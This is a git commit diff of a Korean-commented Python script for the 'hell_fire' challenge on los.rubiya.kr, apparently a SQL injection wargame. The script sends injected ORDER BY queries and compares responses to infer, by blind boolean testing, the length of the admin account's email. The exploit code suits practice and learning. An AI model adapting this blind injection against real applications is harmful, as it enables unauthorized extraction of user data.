d0324aeff7a64331aa0924c1c3e20fbc3c0c7bf5
TOR-s <54094330+TOR-s@users.noreply.github.com>
2020-09-11 20:27:39 +0900

    version 2.1

--- code/23_pwlength.py
+++ code/23_pwlength.py
@@ -4,11 +4,11 @@
 import urllib.request
 from urllib.parse import quote
 
-# pw 길이를 10단위로 검사하는 함수
-def pwlength(count):
+# email 길이를 10단위로 검사하는 함수
+def emaillength(count):
         for i in range(count-10, count, 1):
                 
-                # pw의 길이 수를 바꿔주면서 새로운 url을 만듦
+                # email의 길이 수를 바꿔주면서 새로운 url을 만듦
                 url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="
                 query = "(id='admin' and length(email)={}) desc".format(i)
                 query = quote(query)
@@ -26,7 +26,7 @@ def pwlength(count):
                 # query가 포함될 경우 참인 조건
                 # <참고> 포함 : != -1 / 포함X : == -1 
                 if str(response.read()).find("<th>score</th><tr><td>admin</td>") != -1:
-                        print("Find password length : {}".format(i))
+                        print("Find email length : {}".format(i))
                         return count
 
                 else:
@@ -39,28 +39,28 @@ def pwlength(count):
                                 count += 10
                                 return count 
 
-# pwlength()함수를 여러번 호출하기 위해 준비된 함수
-# max_pw는 pwlength()의 count로 10단위 역할
+# emaillength()함수를 여러번 호출하기 위해 준비된 함수
+# max_email는 emaillength()의 count로 10단위 역할
 # stop은 step()함수를 중지시키는 역할
-def step(count,max_pw,stop):
+def step(count,max_email,stop):
         if count == 1:
                 return
         
-        # max_pw와 stop 같을 경우 pwlength()함수 호출
-        if max_pw == stop:
-                max_pw = pwlength(max_pw)
+        # max_email와 stop 같을 경우 emaillength()함수 호출
+        if max_email == stop:
+                max_email = emaillength(max_email)
 
-                # pwlength()함수 호출후에도 같다면 admin을 찾았음을 의미
+                # emaillength()함수 호출후에도 같다면 admin을 찾았음을 의미
                 # => count 1증가시켜 step() 함수 중지시킴
-                if max_pw == stop:
+                if max_email == stop:
                         count += 1
-                        step(count,max_pw,stop)
+                        step(count,max_email,stop)
 
-                # pwlength()함수 호출후 admin을 못찾을 경우
-                # max_pw 증가
-                # admin 찾기 위해 계속 pwlength()함수 호출 필요
-                # => stop == max_pw 조건 만족시켜줌
-                stop = max_pw
-                step(count,max_pw,stop)
+                # emaillength()함수 호출후 admin을 못찾을 경우
+                # max_email 증가
+                # admin 찾기 위해 계속 emaillength()함수 호출 필요
+                # => stop == max_email 조건 만족시켜줌
+                stop = max_email
+                step(count,max_email,stop)
 
 step(0,11,11)
